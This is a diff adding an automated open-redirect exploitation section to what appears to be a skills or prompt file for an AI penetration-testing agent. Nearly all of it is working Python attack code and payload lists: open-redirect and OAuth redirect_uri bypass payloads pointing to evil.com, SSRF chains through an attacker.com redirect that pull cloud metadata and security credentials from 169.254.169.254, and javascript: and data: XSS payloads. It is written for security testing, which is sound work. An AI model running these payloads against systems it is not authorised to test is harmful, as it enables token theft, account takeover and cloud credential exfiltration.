@@ -163,6 +163,285 @@ Test with mixed Unicode normalization and IDNA conversion
 - Cross-application trust erosion and brand abuse
 </impact>
 
+<automation_patterns>
+<title>AUTOMATED OPEN REDIRECT DETECTION AND EXPLOITATION</title>
+
+<critical>Open redirect testing requires automated parser differential testing, multi-hop chain verification, and integration with SSRF/XSS testing.</critical>
+
+<redirect_chain_testing>
+**Automated Redirect Chain Detection:**
+
+```python
+# Use python tool for redirect chain testing
+import requests
+
+def test_open_redirect(target_url, param_name="redirect"):
+    """Test for open redirect with parser bypass payloads."""
+    
+    # Comprehensive bypass payloads
+    payloads = [
+        # Basic
+        "https://evil.com",
+        "//evil.com",
+        "///evil.com",
+        
+        # Userinfo bypass
+        "https://trusted.com@evil.com",
+        "https://trusted.com%40evil.com",
+        
+        # Backslash bypass
+        "https://trusted.com\\\\evil.com",
+        "https://trusted.com\\\\@evil.com",
+        "/\\\\evil.com",
+        
+        # Whitespace/control chars
+        "http%09://evil.com",
+        "http%0A://evil.com",
+        
+        # Fragment/query confusion
+        "trusted.com#@evil.com",
+        "trusted.com?//@evil.com",
+        
+        # Unicode/IDN
+        "https://truѕted.com",  # Cyrillic 's'
+        "https://trusted.com。evil.com",  # Full-width dot
+        
+        # Double encoding
+        "%2f%2fevil.com",
+        "%252f%252fevil.com",
+        
+        # IP variants
+        "http://2130706433",  # Decimal for 127.0.0.1
+        "http://0x7f.1",  # Hex notation
+    ]
+    
+    findings = []
+    
+    for payload in payloads:
+        try:
+            resp = requests.get(
+                target_url,
+                params={param_name: payload},
+                allow_redirects=False,
+                timeout=5
+            )
+            
+            # Check for 3xx redirect
+            if resp.status_code in [301, 302, 303, 307, 308]:
+                location = resp.headers.get('Location', '')
+                
+                # Check if redirecting to external domain
+                if 'evil.com' in location or not location.startswith(('/', 'http://trusted.com', 'https://trusted.com')):
+                    print(f"[!] OPEN REDIRECT: {payload}")
+                    print(f"    Location: {location}")
+                    findings.append({
+                        "payload": payload,
+                        "location": location,
+                        "status": resp.status_code
+                    })
+                    
+        except Exception as e:
+            pass
+    
+    return findings
+
+# Execute
+findings = test_open_redirect("https://target.com/redirect", "url")
+print(f"\n[*] Found {len(findings)} open redirect vulnerabilities")
+```
+
+**Multi-Hop Chain Testing:**
+```python
+def test_multi_hop_redirect(target_url, param_name="redirect"):
+    """Test if only first hop is validated."""
+    
+    # Setup attacker-controlled redirect server
+    # For testing, use a service like redirect.pizza or your own
+    
+    # Payload: trusted.com → attacker.com/redirect → evil.com
+    intermediate_url = "https://attacker.com/redirect?to=https://evil.com"
+    
+    resp = requests.get(
+        target_url,
+        params={param_name: intermediate_url},
+        allow_redirects=True,  # Follow redirects
+        timeout=5
+    )
+    
+    # Check final URL
+    if 'evil.com' in resp.url:
+        print("[!] MULTI-HOP BYPASS: Validation only on first hop")
+        print(f"    Final URL: {resp.url}")
+        return True
+    
+    return False
+
+test_multi_hop_redirect("https://target.com/redirect", "url")
+```
+</redirect_chain_testing>
+
+<oauth_flow_testing>
+**Automated OAuth redirect_uri Testing:**
+
+```python
+def test_oauth_redirect_uri(auth_endpoint, client_id):
+    """Test OAuth redirect_uri validation."""
+    
+    # OAuth redirect_uri bypass payloads
+    redirect_uris = [
+        # Basic external
+        "https://evil.com/callback",
+        
+        # Subdomain confusion
+        "https://trusted.com.evil.com/callback",
+        
+        # Path traversal
+        "https://trusted.com/oauth/../../@evil.com",
+        
+        # Userinfo
+        "https://trusted.com@evil.com/callback",
+        
+        # Open redirect on trusted domain
+        "https://trusted.com/redirect?url=https://evil.com",
+        
+        # post_logout_redirect_uri (often less strict)
+        "https://evil.com/logout"
+    ]
+    
+    for redirect_uri in redirect_uris:
+        try:
+            # Construct OAuth authorization URL
+            auth_url = (
+                f"{auth_endpoint}?"
+                f"client_id={client_id}&"
+                f"redirect_uri={redirect_uri}&"
+                f"response_type=code&"
+                f"scope=openid"
+            )
+            
+            resp = requests.get(auth_url, allow_redirects=False)
+            
+            # Check if OAuth provider accepts the redirect_uri
+            if resp.status_code == 200 or 'login' in resp.text.lower():
+                print(f"[!] ACCEPTED redirect_uri: {redirect_uri}")
+            elif resp.status_code in [301, 302]:
+                location = resp.headers.get('Location', '')
+                if redirect_uri in location:
+                    print(f"[!] OAUTH BYPASS: {redirect_uri}")
+                    
+        except Exception as e:
+            pass
+
+# Execute
+test_oauth_redirect_uri(
+    "https://auth.example.com/oauth/authorize",
+    "client_12345"
+)
+```
+</oauth_flow_testing>
+
+<ssrf_integration>
+**Chaining Open Redirect with SSRF:**
+
+```python
+def test_redirect_ssrf_chain(target_url, redirect_param="url"):
+    """Test if server-side fetcher follows redirects to internal targets."""
+    
+    # Setup: Need a redirect endpoint you control
+    # For testing, use a service or your own server
+    
+    # Attacker server redirects to internal metadata
+    attacker_redirect = "https://attacker.com/redirect-to-metadata"
+    # This redirects to: http://169.254.169.254/latest/meta-data/
+    
+    try:
+        resp = requests.post(
+            target_url,
+            json={redirect_param: attacker_redirect},
+            timeout=10
+        )
+        
+        # Check for AWS metadata indicators
+        if any(indicator in resp.text.lower() for indicator in 
+               ['ami-id', 'instance-id', 'iam', 'security-credentials']):
+            print("[!] SSRF VIA REDIRECT: Metadata accessible")
+            print(f"    Response: {resp.text[:200]}")
+            return True
+            
+    except Exception as e:
+        pass
+    
+    return False
+
+# Alternative: Test with OAST
+def test_redirect_ssrf_oast(target_url, oast_domain, redirect_param="url"):
+    """Test blind SSRF via redirect using OAST."""
+    
+    # Attacker redirect: trusted.com → oast_domain
+    attacker_redirect = f"https://attacker.com/redirect?to=http://{oast_domain}"
+    
+    requests.post(target_url, json={redirect_param: attacker_redirect})
+    
+    print(f"[*] Sent redirect chain to OAST: {oast_domain}")
+    print(f"[*] Check OAST for HTTP request from target server")
+    # If OAST receives request, server follows redirects (SSRF possible)
+
+test_redirect_ssrf_chain("https://target.com/api/fetch", "url")
+```
+
+**Testing XSS via javascript: Redirect:**
+```python
+def test_redirect_xss(target_url, redirect_param="next"):
+    """Test if javascript: URLs are allowed in redirects."""
+    
+    xss_payloads = [
+        "javascript:alert(1)",
+        "javascript:alert(document.domain)",
+        "javascript://evil.com%0Aalert(1)",
+        "data:text/html,<script>alert(1)</script>"
+    ]
+    
+    for payload in xss_payloads:
+        resp = requests.get(
+            target_url,
+            params={redirect_param: payload},
+            allow_redirects=False
+        )
+        
+        if resp.status_code in [301, 302, 303, 307, 308]:
+            location = resp.headers.get('Location', '')
+            if 'javascript:' in location or 'data:' in location:
+                print(f"[!] XSS VIA REDIRECT: {payload}")
+                print(f"    Location: {location}")
+
+test_redirect_xss("https://target.com/login", "next")
+```
+</ssrf_integration>
+
+<tool_selection>
+**When to use each tool:**
+
+1. **python tool** (PRIMARY for Open Redirect):
+   - Parser differential testing
+   - Multi-hop chain verification
+   - OAuth redirect_uri fuzzing
+   - SSRF/XSS integration testing
+
+2. **browser_action tool**:
+   - Visual confirmation of redirect
+   - Testing client-side redirects (location.href, meta refresh)
+   - Capturing final URL after JavaScript redirects
+
+3. **terminal tool**:
+   - Quick curl-based redirect testing
+   - Running specialized tools (qsreplace + httpx)
+
+4. **web_search tool**:
+   - Finding latest parser bypass techniques
+   - Researching OAuth/OIDC security best practices
+</tool_selection>
+</automation_patterns>
+
 <pro_tips>
 1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses.
 2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early; they catch many weak validators.
